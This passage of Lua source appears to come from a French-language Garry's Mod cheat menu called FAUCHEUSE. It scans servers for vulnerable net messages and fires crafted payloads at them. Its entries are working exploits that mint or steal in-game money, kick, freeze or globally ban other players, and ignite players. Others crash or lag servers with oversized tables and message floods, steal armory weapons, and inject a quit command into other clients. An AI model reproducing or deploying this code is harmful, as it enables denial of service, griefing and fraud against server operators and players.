FAUCHEUSE.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -FAUCHEUSE.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Enlever Argent", func = function()
FAUCHEUSE.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Mettre le Feu", {
desc = "Mettre les props/joueur en feu.",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Feux Props", func = function()
FAUCHEUSE.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Feux Joueurs", func = function()
FAUCHEUSE.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Modifier la Vie", {
desc = "Changer la vie des joueurs",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Vie Normal", func = function()
FAUCHEUSE.NetStart("drugseffect_hpremove")
net.WriteString(FAUCHEUSE.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Teleportation", {
desc = "Teleporter les joueurs que vous regarder au spawn)",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Teleport", func = function()
FAUCHEUSE.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Supprimer les props 2", {
desc = "",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
FAUCHEUSE.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Kick 3", {
desc = "Exploit pour kick tous les joueurs",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Kick", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Kick 2", {
desc = "Exploit pour kick",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Kick", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Loot Items", {
desc = "Auto-Loot des items",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Loot", func = function()
for k, v in pairs(ents.GetAll()) do         
if v:GetClass() == "item_loot" then                 
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Kick tout le monde", {
desc = "Exploit pour kick tous les joueurs",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Kick", func = function()
if !timer.Exists( "kickallnoob" ) then
FAUCHEUSE.ChatText( "Kick tout le monde lancé" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do 
FAUCHEUSE.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
FAUCHEUSE.ChatText( "Kick tout le monde stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Kick 1", {
desc = "Exploit pour kick les Admins",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Kick", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart('plyWarning')          
net.WriteEntity(v)          
net.WriteString('You have to select a player before doing a action.')       
net.SendToServer()
FAUCHEUSE.ChatText("Tentative de kick sur ".. v:Nick().. "!")
end
end, },
},
} )
FAUCHEUSE.AddExploit( "NLR Freeze", {
desc = "Exploit pour freeze des joueurs",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Freeze", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end  
end, },
},
} )
FAUCHEUSE.AddExploit( "Supprimer les props 1", {
desc = "Supprimer touts les props du serveur x)",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
for k,v in pairs(ents.GetAll()) do
FAUCHEUSE.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Hack Keypads", {
desc = "Cracker les keypads instantanément.",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Hacker", func = function()
FAUCHEUSE.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Kart System €", {
desc = "Exploit d'argent.",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for i=1, 300 do
FAUCHEUSE.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Farming Mod €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   FAUCHEUSE.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Point Shop €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart("ClickerAddToPoints")
net.WriteInt(FAUCHEUSE.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
FAUCHEUSE.AddExploit( "Body Groups", {
desc = "Changer de skin",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Changer", func = function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1   
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
FAUCHEUSE.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
FAUCHEUSE.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
FAUCHEUSE.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
FAUCHEUSE.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
FAUCHEUSE.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Hitman X €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Donner", func = function()
local t = FAUCHEUSE.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -FAUCHEUSE.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
hook.Remove( "HUDPaint", "skhdsakjl")
local t = FAUCHEUSE.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( FAUCHEUSE.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Bail Out €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Donner", func = function()
local t = FAUCHEUSE.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -FAUCHEUSE.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = FAUCHEUSE.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
FAUCHEUSE.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( FAUCHEUSE.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Tow Truck €", {
desc = "Spawn vehicule dépanneur / Exploit d'argent Regarder le vehicule qui possède une amande",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn Dépanneuse", func = function()
FAUCHEUSE.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Argent Exploit", func = function()
for k,v in pairs(ents.GetAll()) do 
FAUCHEUSE.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-FAUCHEUSE.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
FAUCHEUSE.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Fire Truck", {
desc = "Spawn camion de pompier",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
FAUCHEUSE.NetStart("FIRE_CreateFireTruck")
net.SendToServer()    
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Hit Menu €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Prendre", func = function()
FAUCHEUSE.NetStart("hitcomplete")
net.WriteDouble(FAUCHEUSE.GetStored( "montant_argent18" ))               
net.SendToServer()      
end, },
},
} )
FAUCHEUSE.AddExploit( "€ HHH €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
local plyhhh = LocalPlayer()              
for k,v in pairs(player.GetAll()) do                
dahater = v   
end        
if dahater != plyhhh then       
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
FAUCHEUSE.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
FAUCHEUSE.ChatText( "Cette version de HHH n'est pas exploitable !" )    
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ DaHit €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Donner", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "DaHit" )               
net.WriteFloat( -FAUCHEUSE.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()  
end  
end, },
{ typ = "func", name = "Enlever", func = function()
local t = FAUCHEUSE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "DaHit" )               
net.WriteFloat( FAUCHEUSE.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end, },
{ typ = "func", name = "Spam Prendre", func = function()
if !timer.Exists( "Reaper_exploit_spamdahitprendre" ) then
FAUCHEUSE.ChatText( "Spam lancé" )
timer.Create( "Reaper_exploit_spamdahitprendre", 1, 0, function()
local t = FAUCHEUSE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "DaHit" )               
net.WriteFloat( -FAUCHEUSE.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end)
else
timer.Remove( "Reaper_exploit_spamdahitprendre" )
FAUCHEUSE.ChatText( "Spam stoppé" )
end
end, },
{ typ = "func", name = "Spam Enlever", func = function()
if !timer.Exists( "Reaper_exploit_spamdahitenlever" ) then
FAUCHEUSE.ChatText( "Spam lancé" )
timer.Create( "Reaper_exploit_spamdahitenlever", 1, 0, function()
local t = FAUCHEUSE.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
FAUCHEUSE.NetStart( "DaHit" )               
net.WriteFloat( FAUCHEUSE.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end)
else
timer.Remove( "Reaper_exploit_spamdahitenlever" )
FAUCHEUSE.ChatText( "Spam stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Anti-Printer", {
desc = "Appliquez des dommages constants aux Printers à proximité",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Reaper_exploit_printersmasher" ) then
FAUCHEUSE.ChatText( "Anti-Printer lancé" )
timer.Create( "Reaper_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
FAUCHEUSE.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "Reaper_exploit_printersmasher" )
FAUCHEUSE.ChatText( "Anti-Printer stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Crash le Serveur", {
desc = "Comme sont nom l'indique niquez moi ce serveur de la",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
FAUCHEUSE.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Munitions Gratuite", {
desc = "Vous donne des munitions pour toutes vos armes",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(GAMEMODE.AmmoTypes) do
FAUCHEUSE.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "€ Advanced Money Printer €", {
desc = "Voler tout l'argent des printers",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then    
FAUCHEUSE.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "gBan Ban Global", {
desc = "Exploit pout bannir tout le monde sauf toi ^^, exploit trouvé dans une ancienne version de gBan",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Bannir Tous", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then       
FAUCHEUSE.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Des poutous partout" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Exploit Lags ATS", {
desc = "L'admin devrait avoir honte de faire payer un VIP.",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Lancer Lags", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit1" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
FAUCHEUSE.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
FAUCHEUSE.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
FAUCHEUSE.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit1" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Spam Console", {
desc = "Spam la console et peut éventuellement créé des lags",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Reaper_exploit_bigspames2" ) then
FAUCHEUSE.ChatText( "Spam et lag lancé." )
timer.Create( "Reaper_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u forget your promess forever but sorry you are a friend" )
end
end)
else
timer.Remove( "Reaper_exploit_bigspames2" )
FAUCHEUSE.ChatText( "Spam et lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Exploits Lags Keypads", {
desc = "Clique pour mettre en PLS le serveur!",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Lancer Lags", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit4" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
FAUCHEUSE.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit4" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Spam Console", {
desc = "Supposé être un lag exploit mais ne provoque pas de lags, juste des spams console",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Reaper_exploit_bigspames2" ) then
FAUCHEUSE.ChatText( "Spam et lag lancé." )
timer.Create( "Reaper_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u forget your promess forever but sorry you are a friend" )
end
end)
else
timer.Remove( "Reaper_exploit_bigspames2" )
FAUCHEUSE.ChatText( "Spam et lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Quitter Votre Jeu", {
desc = "Le suicide du jeu c'est cool :D",
severity = 4,
scan = function() return FAUCHEUSE.ValidNetString( "nostrip" ) end,
functions = {
{ typ = "players", addr = "casserjeu" },
{ typ = "func", name = "Casser Le Jeu", func = function()
if !timer.Exists( "trollishere" ) then
FAUCHEUSE.ChatText( "Ultra Bug Lancé !" )
timer.Create( "trollishere", 0.02, 0, function()
for i = 1, 300 do
FAUCHEUSE.NetStart( "nostrip" )
net.WriteString( "RunConsoleCommand(\"quit\")" )
net.SendToServer()
end
end)
else
timer.Remove( "trollishere" )
FAUCHEUSE.ChatText( "Ultra Bug Stoppé !" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Exploit Lags", {
desc = "Faire lag le serveur comme s'il était hébergé en Afrique",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Lancer Lags", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit5" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
FAUCHEUSE.NetStart( "CreateCase" )
net.WriteString( "rtsitestristemonkhey" )
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit5" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Exploit Lags RProtect", {
desc = "Il doit y en avoir des merdes dans ce serveur !",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Lancer Lags", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit6" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
FAUCHEUSE.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit6" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Exploit Lags Stacker", {
desc = "Faire crash un serveur sans props ? Cool :D",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Lancer Lags", func = function()
if !timer.Exists( "Reaper_exploit_lagsploit7" ) then
FAUCHEUSE.ChatText( "Lag lancé" )
timer.Create( "Reaper_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
FAUCHEUSE.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "Reaper_exploit_lagsploit7" )
FAUCHEUSE.ChatText( "Lag stoppé" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Exploit De Réanimation", {
desc = "Vous etes automatiquement réanimé après avoir été tué",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Immortel :)", func = function()
if !timer.Exists( "Reaper_exploit_zombie" ) then
FAUCHEUSE.ChatText( "Tu es Immortel" )
timer.Create( "Reaper_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
FAUCHEUSE.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Reaper_exploit_zombie" )
FAUCHEUSE.ChatText( "Tu es redevenu Mortel!" )
end
end, },
},
} )
FAUCHEUSE.AddExploit( "Exploit Armory Robbery", {
desc = "Prenez les armes de la police à l'armurerie (Vous devez etre proche d'elle), a un temps de recharge de 5 minutes",
severity = 2,
scan = function() return FAUCHEUSE.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Prendre Arme 1", func = function()
FAUCHEUSE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 2", func = function()
FAUCHEUSE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 3", func = function()
FAUCHEUSE.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Admin Stick / Porte exploit", {
desc = "Déverrouiller / Verrouiller Porte / Enlever le proprio (vous devez regarder une porte)",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Déverrouiller", func = function()
FAUCHEUSE.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Verrouiller", func = function()
FAUCHEUSE.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Enlever le Propriétaire", func = function()
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
FAUCHEUSE.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Spam Report", {
desc = "Envoyer des Report sur tout le monde",
severity = 1,
scan = function() return FAUCHEUSE.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Report Tout le Monde", func = function()
for k, v in pairs( player.GetAll() ) do
FAUCHEUSE.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVEUR CODER AVEC LE Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
FAUCHEUSE.AddExploit( "SAC Crash", {
desc = "Fait instantanément Crash n'importe quel serveur exécutant la simplicité anticheat",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,400 do
tbl[i] = i
end
FAUCHEUSE.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
FAUCHEUSE.AddExploit( "Crash Serveur", {
desc = "Cliquez sur ce bouton pour Crash le serveur instantanément.",
severity = 3,
scan = function() return FAUCHEUSE.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
FAUCHEUSE.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
FAUCHEUSE.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
